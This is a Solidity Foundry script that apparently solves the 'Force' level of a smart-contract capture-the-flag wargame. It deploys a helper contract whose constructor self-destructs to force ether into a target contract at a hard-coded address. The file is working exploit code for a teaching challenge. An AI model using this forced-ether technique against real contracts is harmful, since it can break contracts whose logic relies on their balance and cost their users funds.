// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/Level07.sol";

contract SelfDestruct {
    constructor(address payable _to) payable {
        selfdestruct(_to);
    }
}

contract ForceScript is Script {
    Force public forceInstance;

    function setUp() public {
        forceInstance = Force(0xCeDeF04ec24B81d8605a2529854F377e1AA8eCb9);
    }

    function run() public {
        vm.startBroadcast();

        new SelfDestruct{value: 0.0005 ether}(payable(address(forceInstance)));

        vm.stopBroadcast();
    }
}
